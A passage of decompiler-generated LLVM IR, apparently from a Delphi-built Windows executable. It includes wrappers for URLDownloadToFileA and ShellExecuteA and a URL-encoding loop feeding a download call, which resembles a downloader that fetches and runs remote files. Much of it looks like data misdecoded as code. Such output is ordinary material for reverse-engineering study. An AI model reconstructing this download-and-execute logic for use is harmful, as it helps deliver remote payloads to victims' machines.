  store i8 %214, i8* %211, align 1, !insn.addr !362
  %215 = load i32, i32* %eax, align 4
  %216 = inttoptr i32 %215 to i8*, !insn.addr !363
  %217 = load i8, i8* %216, align 1, !insn.addr !363
  %218 = trunc i32 %215 to i8, !insn.addr !363
  %219 = add i8 %217, %218, !insn.addr !363
  store i8 %219, i8* %216, align 1, !insn.addr !363
  %220 = load i32, i32* %eax, align 4
  %221 = inttoptr i32 %220 to i8*, !insn.addr !364
  %222 = load i8, i8* %221, align 1, !insn.addr !364
  %223 = trunc i32 %220 to i8, !insn.addr !364
  %224 = add i8 %222, %223, !insn.addr !364
  store i8 %224, i8* %221, align 1, !insn.addr !364
  %225 = load i32, i32* %eax, align 4
  %226 = inttoptr i32 %225 to i8*, !insn.addr !365
  %227 = load i8, i8* %226, align 1, !insn.addr !365
  %228 = trunc i32 %225 to i8, !insn.addr !365
  %229 = add i8 %227, %228, !insn.addr !365
  store i8 %229, i8* %226, align 1, !insn.addr !365
  %230 = load i32, i32* %eax, align 4
  %231 = inttoptr i32 %230 to i8*, !insn.addr !366
  %232 = load i8, i8* %231, align 1, !insn.addr !366
  %233 = trunc i32 %230 to i8, !insn.addr !366
  %234 = add i8 %232, %233, !insn.addr !366
  store i8 %234, i8* %231, align 1, !insn.addr !366
  %235 = load i32, i32* %eax, align 4
  %236 = inttoptr i32 %235 to i8*, !insn.addr !367
  %237 = load i8, i8* %236, align 1, !insn.addr !367
  %238 = trunc i32 %235 to i8, !insn.addr !367
  %239 = add i8 %237, %238, !insn.addr !367
  store i8 %239, i8* %236, align 1, !insn.addr !367
  %240 = load i32, i32* %eax, align 4, !insn.addr !367
  ret i32 %240, !insn.addr !367

dec_label_pc_404916:                              ; preds = %dec_label_pc_404891
  %241 = icmp eq i8 %164, 0, !insn.addr !368
  store i8 %164, i8* %161, align 1, !insn.addr !368
  %242 = load i32, i32* %eax, align 4
  %243 = inttoptr i32 %242 to i8*
  %244 = load i8, i8* %243, align 1
  %245 = trunc i32 %242 to i8
  %246 = add i8 %244, %245
  store i8 %246, i8* %243, align 1
  %247 = load i32, i32* %eax, align 4
  %248 = inttoptr i32 %247 to i8*
  %249 = load i8, i8* %248, align 1
  %250 = trunc i32 %247 to i8
  %251 = add i8 %249, %250
  store i8 %251, i8* %248, align 1
  %252 = load i32, i32* %eax, align 4
  br i1 %241, label %dec_label_pc_404990, label %dec_label_pc_404999, !insn.addr !369

dec_label_pc_404990:                              ; preds = %dec_label_pc_404916
  ret i32 %252, !insn.addr !370

dec_label_pc_404999:                              ; preds = %dec_label_pc_404916
  %253 = inttoptr i32 %252 to i8*, !insn.addr !371
  %254 = load i8, i8* %253, align 1, !insn.addr !371
  %255 = trunc i32 %252 to i8, !insn.addr !371
  %256 = add i8 %254, %255, !insn.addr !371
  store i8 %256, i8* %253, align 1, !insn.addr !371
  %257 = load i32, i32* %eax, align 4
  %258 = inttoptr i32 %257 to i8*, !insn.addr !372
  %259 = load i8, i8* %258, align 1, !insn.addr !372
  %260 = trunc i32 %257 to i8, !insn.addr !372
  %261 = add i8 %259, %260, !insn.addr !372
  store i8 %261, i8* %258, align 1, !insn.addr !372
  %262 = load i32, i32* %eax, align 4
  %263 = inttoptr i32 %262 to i8*, !insn.addr !373
  %264 = load i8, i8* %263, align 1, !insn.addr !373
  %265 = trunc i32 %262 to i8, !insn.addr !373
  %266 = add i8 %264, %265, !insn.addr !373
  store i8 %266, i8* %263, align 1, !insn.addr !373
  %267 = load i32, i32* %eax, align 4
  %268 = inttoptr i32 %267 to i8*, !insn.addr !374
  %269 = load i8, i8* %268, align 1, !insn.addr !374
  %270 = trunc i32 %267 to i8, !insn.addr !374
  %271 = add i8 %269, %270, !insn.addr !374
  store i8 %271, i8* %268, align 1, !insn.addr !374
  %272 = load i32, i32* %eax, align 4
  %273 = inttoptr i32 %272 to i8*, !insn.addr !375
  %274 = load i8, i8* %273, align 1, !insn.addr !375
  %275 = trunc i32 %272 to i8, !insn.addr !375
  %276 = add i8 %274, %275, !insn.addr !375
  store i8 %276, i8* %273, align 1, !insn.addr !375
  %277 = load i32, i32* %eax, align 4
  %278 = inttoptr i32 %277 to i8*, !insn.addr !376
  %279 = load i8, i8* %278, align 1, !insn.addr !376
  %280 = trunc i32 %277 to i8, !insn.addr !376
  %281 = add i8 %279, %280, !insn.addr !376
  store i8 %281, i8* %278, align 1, !insn.addr !376
  %282 = load i32, i32* %eax, align 4
  %283 = inttoptr i32 %282 to i8*, !insn.addr !377
  %284 = load i8, i8* %283, align 1, !insn.addr !377
  %285 = trunc i32 %282 to i8, !insn.addr !377
  %286 = add i8 %284, %285, !insn.addr !377
  store i8 %286, i8* %283, align 1, !insn.addr !377
  %287 = add i32 %1, -117, !insn.addr !378
  %288 = inttoptr i32 %287 to i8*, !insn.addr !378
  %289 = load i8, i8* %288, align 1, !insn.addr !378
  %290 = trunc i32 %2 to i8, !insn.addr !378
  %291 = add i8 %289, %290, !insn.addr !378
  store i8 %291, i8* %288, align 1, !insn.addr !378
  %292 = trunc i32 %2 to i16, !insn.addr !379
  %293 = call i8 @__asm_in(i16 %292), !insn.addr !379
  %294 = sext i8 %293 to i32, !insn.addr !379
  %295 = load i32, i32* %eax, align 4, !insn.addr !379
  %296 = and i32 %295, -256, !insn.addr !379
  %297 = or i32 %296, %294, !insn.addr !379
  ret i32 %297, !insn.addr !379
}

define i32 @function_404a05() local_unnamed_addr {
dec_label_pc_404a05:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !380
  ret i32 %0, !insn.addr !380
}

define i32 @function_404a0a() local_unnamed_addr {
dec_label_pc_404a0a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !381
}

define i32 @function_404a0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a0c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !382
}

define i32 @function_404a10() local_unnamed_addr {
dec_label_pc_404a10:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40968c, align 4, !insn.addr !383
  %2 = add i32 %1, -1, !insn.addr !383
  store i32 %2, i32* @global_var_40968c, align 4, !insn.addr !383
  ret i32 %0, !insn.addr !384
}

define i32* @function_404a18(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd) local_unnamed_addr {
dec_label_pc_404a18:
  %0 = call i32* @ShellExecuteA(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd), !insn.addr !385
  ret i32* %0, !insn.addr !385
}

define i32 @function_404a20() local_unnamed_addr {
dec_label_pc_404a20:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !386
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !386
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !386
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !387
  %2 = load i32, i32* @global_var_409690, align 4, !insn.addr !388
  %3 = add i32 %2, 1, !insn.addr !388
  store i32 %3, i32* @global_var_409690, align 4, !insn.addr !388
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !389
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !390
  ret i32 0, !insn.addr !391
}

define i32 @function_404a45() local_unnamed_addr {
dec_label_pc_404a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !392
  ret i32 %0, !insn.addr !392
}

define i32 @function_404a4a() local_unnamed_addr {
dec_label_pc_404a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !393
}

define i32 @function_404a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !394
}

define i32 @function_404a50() local_unnamed_addr {
dec_label_pc_404a50:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409690, align 4, !insn.addr !395
  %2 = add i32 %1, -1, !insn.addr !395
  store i32 %2, i32* @global_var_409690, align 4, !insn.addr !395
  ret i32 %0, !insn.addr !396
}

define i32 @function_404a58() local_unnamed_addr {
dec_label_pc_404a58:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !397
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !397
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !397
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !398
  %2 = load i32, i32* @global_var_409694, align 4, !insn.addr !399
  %3 = add i32 %2, 1, !insn.addr !399
  store i32 %3, i32* @global_var_409694, align 4, !insn.addr !399
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !400
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !401
  ret i32 0, !insn.addr !402
}

define i32 @function_404a7d() local_unnamed_addr {
dec_label_pc_404a7d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !403
  ret i32 %0, !insn.addr !403
}

define i32 @function_404a82() local_unnamed_addr {
dec_label_pc_404a82:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !404
}

define i32 @function_404a84(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a84:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !405
}

define i32 @function_404a88() local_unnamed_addr {
dec_label_pc_404a88:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409694, align 4, !insn.addr !406
  %2 = add i32 %1, -1, !insn.addr !406
  store i32 %2, i32* @global_var_409694, align 4, !insn.addr !406
  ret i32 %0, !insn.addr !407
}

define i32 @function_404a90() local_unnamed_addr {
dec_label_pc_404a90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !408
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !408
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !408
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !409
  %2 = load i32, i32* @global_var_409698, align 4, !insn.addr !410
  %3 = add i32 %2, 1, !insn.addr !410
  store i32 %3, i32* @global_var_409698, align 4, !insn.addr !410
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !411
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !412
  ret i32 0, !insn.addr !413
}

define i32 @function_404ab5() local_unnamed_addr {
dec_label_pc_404ab5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !414
  ret i32 %0, !insn.addr !414
}

define i32 @function_404aba() local_unnamed_addr {
dec_label_pc_404aba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !415
}

define i32 @function_404abc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !416
}

define i32 @function_404ac0() local_unnamed_addr {
dec_label_pc_404ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409698, align 4, !insn.addr !417
  %2 = add i32 %1, -1, !insn.addr !417
  store i32 %2, i32* @global_var_409698, align 4, !insn.addr !417
  ret i32 %0, !insn.addr !418
}

define i32 @function_404ac8(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_404ac8:
  %0 = call i32 @URLDownloadToFileA(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5), !insn.addr !419
  ret i32 %0, !insn.addr !419
}

define i32 @function_404ad0() local_unnamed_addr {
dec_label_pc_404ad0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !420
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !420
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !420
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !421
  %2 = load i32, i32* @global_var_40969c, align 4, !insn.addr !422
  %3 = add i32 %2, 1, !insn.addr !422
  store i32 %3, i32* @global_var_40969c, align 4, !insn.addr !422
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !423
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !424
  ret i32 0, !insn.addr !425
}

define i32 @function_404af5() local_unnamed_addr {
dec_label_pc_404af5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !426
  ret i32 %0, !insn.addr !426
}

define i32 @function_404afa() local_unnamed_addr {
dec_label_pc_404afa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !427
}

define i32 @function_404afc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404afc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !428
}

define i32 @function_404b00() local_unnamed_addr {
dec_label_pc_404b00:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40969c, align 4, !insn.addr !429
  %2 = add i32 %1, -1, !insn.addr !429
  store i32 %2, i32* @global_var_40969c, align 4, !insn.addr !429
  ret i32 %0, !insn.addr !430
}

define i32 @function_404b08() local_unnamed_addr {
dec_label_pc_404b08:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !431
  %2 = icmp ult i8 %1, 10
  %3 = and i32 %0, 255
  br i1 %2, label %dec_label_pc_404b0c, label %dec_label_pc_404b15, !insn.addr !432

dec_label_pc_404b0c:                              ; preds = %dec_label_pc_404b08
  %4 = add nuw nsw i32 %3, 48, !insn.addr !433
  ret i32 %4, !insn.addr !434

dec_label_pc_404b15:                              ; preds = %dec_label_pc_404b08
  %5 = add nuw nsw i32 %3, 55, !insn.addr !435
  ret i32 %5, !insn.addr !436
}

define i32 @function_404b20() local_unnamed_addr {
dec_label_pc_404b20:
  %esp.2.reg2mem = alloca i32, !insn.addr !437
  %esp.1.reg2mem = alloca i32, !insn.addr !437
  %cf.0.reg2mem = alloca i1, !insn.addr !437
  %esi.0.reg2mem = alloca i32, !insn.addr !437
  %esp.0.reg2mem = alloca i32, !insn.addr !437
  %ebx.0.reg2mem = alloca i32, !insn.addr !437
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !438
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !439
  store i32 %2, i32* %stack_var_-52, align 4, !insn.addr !439
  %3 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !439
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !440
  %4 = call i32 @"@LStrClr"(), !insn.addr !441
  %5 = call i32 @function_4034c8(), !insn.addr !442
  %6 = icmp slt i32 %5, 1
  store i32 %3, i32* %esp.2.reg2mem, !insn.addr !443
  br i1 %6, label %dec_label_pc_404c21, label %dec_label_pc_404b6d.preheader, !insn.addr !443

dec_label_pc_404b6d.preheader:                    ; preds = %dec_label_pc_404b20
  %7 = add i32 %0, -1, !insn.addr !444
  store i32 1, i32* %ebx.0.reg2mem
  store i32 %3, i32* %esp.0.reg2mem
  store i32 %5, i32* %esi.0.reg2mem
  br label %dec_label_pc_404b6d

dec_label_pc_404b6d:                              ; preds = %dec_label_pc_404b6d.preheader, %dec_label_pc_404c19
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %7, %ebx.0.reload, !insn.addr !444
  %9 = inttoptr i32 %8 to i8*, !insn.addr !444
  %10 = load i8, i8* %9, align 1, !insn.addr !444
  %11 = icmp eq i8 %10, 32, !insn.addr !444
  %12 = icmp eq i1 %11, false, !insn.addr !445
  br i1 %12, label %dec_label_pc_404b88, label %dec_label_pc_404b77, !insn.addr !445

dec_label_pc_404b77:                              ; preds = %dec_label_pc_404b6d
  %13 = call i32 @"@LStrCat"(), !insn.addr !446
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !447
  br label %dec_label_pc_404c19, !insn.addr !447

dec_label_pc_404b88:                              ; preds = %dec_label_pc_404b6d
  %14 = icmp ult i8 %10, 32, !insn.addr !448
  br i1 %14, label %dec_label_pc_404bab, label %dec_label_pc_404b92, !insn.addr !449

dec_label_pc_404b92:                              ; preds = %dec_label_pc_404b88
  %15 = add i8 %10, -32, !insn.addr !450
  %16 = icmp ult i8 %15, 95, !insn.addr !451
  %17 = icmp ult i8 %15, 96
  store i1 %16, i1* %cf.0.reg2mem, !insn.addr !452
  br i1 %17, label %dec_label_pc_404b9f, label %dec_label_pc_404ba9, !insn.addr !452

dec_label_pc_404b9f:                              ; preds = %dec_label_pc_404b92
  %18 = load i32, i32* inttoptr (i32 4213856 to i32*), align 32, !insn.addr !453
  %19 = and i8 %15, 31
  %20 = zext i8 %19 to i32, !insn.addr !453
  %21 = shl i32 1, %20, !insn.addr !453
  %22 = and i32 %18, %21, !insn.addr !453
  %23 = icmp ne i32 %22, 0, !insn.addr !453
  store i1 %23, i1* %cf.0.reg2mem, !insn.addr !453
  br label %dec_label_pc_404ba9, !insn.addr !453

dec_label_pc_404ba9:                              ; preds = %dec_label_pc_404b92, %dec_label_pc_404b9f
  %cf.0.reload = load i1, i1* %cf.0.reg2mem
  %24 = icmp eq i1 %cf.0.reload, false, !insn.addr !454
  br i1 %24, label %dec_label_pc_404c00, label %dec_label_pc_404bab, !insn.addr !454

dec_label_pc_404bab:                              ; preds = %dec_label_pc_404ba9, %dec_label_pc_404b88
  %25 = and i8 %10, 15
  %26 = zext i8 %25 to i32, !insn.addr !455
  %27 = add i32 %esp.0.reload, -4, !insn.addr !456
  %28 = inttoptr i32 %27 to i32*, !insn.addr !456
  store i32 %26, i32* %28, align 4, !insn.addr !456
  %29 = add i32 %esp.0.reload, -8, !insn.addr !457
  %30 = inttoptr i32 %29 to i32*, !insn.addr !457
  store i32 ptrtoint (i32* @global_var_404c74 to i32), i32* %30, align 4, !insn.addr !457
  %31 = call i32 @function_404b08(), !insn.addr !458
  %32 = call i32 @"@LStrFromChar"(), !insn.addr !459
  %33 = add i32 %esp.0.reload, -12, !insn.addr !460
  %34 = inttoptr i32 %33 to i32*, !insn.addr !460
  store i32 0, i32* %34, align 4, !insn.addr !460
  %35 = call i32 @function_404b08(), !insn.addr !461
  %36 = call i32 @"@LStrFromChar"(), !insn.addr !462
  %37 = add i32 %esp.0.reload, -16, !insn.addr !463
  %38 = inttoptr i32 %37 to i32*, !insn.addr !463
  store i32 0, i32* %38, align 4, !insn.addr !463
  %39 = call i32 @"@LStrCatN"(), !insn.addr !464
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !465
  br label %dec_label_pc_404c19, !insn.addr !465

dec_label_pc_404c00:                              ; preds = %dec_label_pc_404ba9
  %40 = call i32 @"@LStrFromChar"(), !insn.addr !466
  %41 = call i32 @"@LStrCat"(), !insn.addr !467
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !467
  br label %dec_label_pc_404c19, !insn.addr !467

dec_label_pc_404c19:                              ; preds = %dec_label_pc_404c00, %dec_label_pc_404bab, %dec_label_pc_404b77
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %42 = add i32 %ebx.0.reload, 1, !insn.addr !468
  %43 = add i32 %esi.0.reload, -1, !insn.addr !469
  %44 = icmp eq i32 %43, 0, !insn.addr !469
  %45 = icmp eq i1 %44, false, !insn.addr !470
  store i32 %42, i32* %ebx.0.reg2mem, !insn.addr !470
  store i32 %esp.1.reload, i32* %esp.0.reg2mem, !insn.addr !470
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !470
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !470
  br i1 %45, label %dec_label_pc_404b6d, label %dec_label_pc_404c21, !insn.addr !470

dec_label_pc_404c21:                              ; preds = %dec_label_pc_404c19, %dec_label_pc_404b20
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %46 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !471
  %47 = load i32, i32* %46, align 4, !insn.addr !471
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !472
  %48 = add i32 %esp.2.reload, 8, !insn.addr !473
  %49 = inttoptr i32 %48 to i32*, !insn.addr !473
  store i32 4213835, i32* %49, align 4, !insn.addr !473
  %50 = call i32 @"@LStrArrayClr"(), !insn.addr !474
  %51 = call i32 @"@LStrClr"(), !insn.addr !475
  ret i32 %51, !insn.addr !476
}

define i32 @function_404c44() local_unnamed_addr {
dec_label_pc_404c44:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !477
  ret i32 %0, !insn.addr !477
}

define i32 @function_404c49() local_unnamed_addr {
dec_label_pc_404c49:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !478
}

define i32 @function_404c4b(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404c4b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !479
}

define i32 @function_404c6f() local_unnamed_addr {
dec_label_pc_404c6f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !480
  %2 = inttoptr i32 %0 to i32*, !insn.addr !480
  store i32 %1, i32* %2, align 4, !insn.addr !480
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !481
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !481
  %7 = add i8 %4, %6, !insn.addr !481
  %8 = inttoptr i32 %5 to i8*, !insn.addr !481
  store i8 %7, i8* %8, align 1, !insn.addr !481
  %9 = load i8, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !482
  %10 = load i32, i32* %eax, align 4, !insn.addr !482
  %11 = udiv i32 %10, 256, !insn.addr !482
  %12 = trunc i32 %11 to i8, !insn.addr !482
  %13 = add i8 %9, %12, !insn.addr !482
  store i8 %13, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !482
  %14 = call i32 @function_4036b8(), !insn.addr !483
  %15 = call i32 @__readfsdword(i32 0), !insn.addr !484
  store i32 %15, i32* %stack_var_-24, align 4, !insn.addr !484
  %16 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !484
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !485
  %17 = call i32 @"@LStrCatN"(), !insn.addr !486
  %18 = call i32 @function_4036c8(), !insn.addr !487
  %19 = inttoptr i32 %18 to i32*, !insn.addr !488
  %20 = call i32 @URLDownloadToFileA(i32* %19, i8* null, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !488
  call void @__writefsdword(i32 0, i32 0), !insn.addr !489
  %21 = call i32 @"@LStrArrayClr"(), !insn.addr !490
  ret i32 %21, !insn.addr !491
}

define i32 @function_404c78() local_unnamed_addr {
dec_label_pc_404c78:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_404ce6() local_unnamed_addr {
dec_label_pc_404ce6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !492
  ret i32 %0, !insn.addr !492
}

define i32 @function_404ceb() local_unnamed_addr {
dec_label_pc_404ceb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !493
}

define i32 @function_404ced(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404ced:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !494
}

define i32 @function_404cf7() local_unnamed_addr {
dec_label_pc_404cf7:
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !495
  %5 = inttoptr i32 %3 to i32*, !insn.addr !495
  store i32 %4, i32* %5, align 4, !insn.addr !495
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !496
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !496
  %10 = add i8 %7, %9, !insn.addr !496
  %11 = inttoptr i32 %8 to i8*, !insn.addr !496
  store i8 %10, i8* %11, align 1, !insn.addr !496
  %12 = bitcast i32* %edi to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !497
  %14 = udiv i32 %1, 256, !insn.addr !497
  %15 = trunc i32 %14 to i8, !insn.addr !497
  %16 = add i8 %13, %15, !insn.addr !497
  %17 = load i32, i32* %edi, align 4, !insn.addr !497
  %18 = inttoptr i32 %17 to i8*, !insn.addr !497
  store i8 %16, i8* %18, align 1, !insn.addr !497
  %19 = load i8, i8* %6, align 4, !insn.addr !498
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !498
  %22 = add i8 %19, %21, !insn.addr !498
  %23 = inttoptr i32 %20 to i8*, !insn.addr !498
  store i8 %22, i8* %23, align 1, !insn.addr !498
  %24 = add i32 %0, -117, !insn.addr !499
  %25 = inttoptr i32 %24 to i8*, !insn.addr !499
  %26 = load i8, i8* %25, align 1, !insn.addr !499
  %27 = trunc i32 %2 to i8, !insn.addr !499
  %28 = add i8 %26, %27, !insn.addr !499
  store i8 %28, i8* %25, align 1, !insn.addr !499
  %29 = trunc i32 %2 to i16, !insn.addr !500
  %30 = call i8 @__asm_in(i16 %29), !insn.addr !500
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !501
  store i32 %31, i32* %stack_var_-12, align 4, !insn.addr !501
  %32 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !501
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !502
  %33 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !503
  %34 = add i32 %33, 1, !insn.addr !503
  store i32 %34, i32* @global_var_4096a0, align 4, !insn.addr !503
  %35 = load i32, i32* %stack_var_-12, align 4, !insn.addr !504
  call void @__writefsdword(i32 0, i32 %35), !insn.addr !505
  ret i32 0, !insn.addr !506
}

define i32 @function_404d25() local_unnamed_addr {
dec_label_pc_404d25:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !507
  ret i32 %0, !insn.addr !507
}

define i32 @function_404d2a() local_unnamed_addr {
dec_label_pc_404d2a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !508
}

define i32 @function_404d2c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404d2c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !509
}

define i32 @function_404d30() local_unnamed_addr {
dec_label_pc_404d30:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !510
  %2 = add i32 %1, -1, !insn.addr !510
  store i32 %2, i32* @global_var_4096a0, align 4, !insn.addr !510
  ret i32 %0, !insn.addr !511
}

define i32 @function_404d38() local_unnamed_addr {
dec_label_pc_404d38:
  %eax.0.reg2mem = alloca i32, !insn.addr !512
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %0 = call i32 @"@LStrAsg"(), !insn.addr !513
  store i32 0, i32* %stack_var_-116, align 4, !insn.addr !514
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !515
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i8** %stack_var_-132, align 4, !insn.addr !516
  %1 = call i32 @function_40438c(i32 0, i32* nonnull %stack_var_-116, i32 1, i32 0, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i32 -2147483647), !insn.addr !517
  %2 = icmp eq i32 %1, 0, !insn.addr !518
  %3 = icmp eq i1 %2, false, !insn.addr !519
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !519
  br i1 %3, label %dec_label_pc_404db2, label %dec_label_pc_404d6d, !insn.addr !519

dec_label_pc_404d6d:                              ; preds = %dec_label_pc_404d38
  store i8* inttoptr (i32 101 to i8*), i8** %stack_var_-132, align 4, !insn.addr !520
  %4 = bitcast i8** %stack_var_-132 to i32*, !insn.addr !521
  %5 = call i32 @function_404394(i32 101, i32* nonnull %4, i32* nonnull %stack_var_-128, i32* nonnull @global_var_4080f8, i32 0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_404de0, i32 0, i32 0), i32 -2147483647), !insn.addr !521
  %6 = icmp eq i32 %5, 0, !insn.addr !522
  %7 = icmp eq i1 %6, false, !insn.addr !523
  br i1 %7, label %dec_label_pc_404da9, label %dec_label_pc_404d99, !insn.addr !523

dec_label_pc_404d99:                              ; preds = %dec_label_pc_404d6d
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !524
  br label %dec_label_pc_404da9, !insn.addr !524

dec_label_pc_404da9:                              ; preds = %dec_label_pc_404d99, %dec_label_pc_404d6d
  %9 = call i32 @function_404374(), !insn.addr !525
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !525
  br label %dec_label_pc_404db2, !insn.addr !525

dec_label_pc_404db2:                              ; preds = %dec_label_pc_404da9, %dec_label_pc_404d38
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !526
}

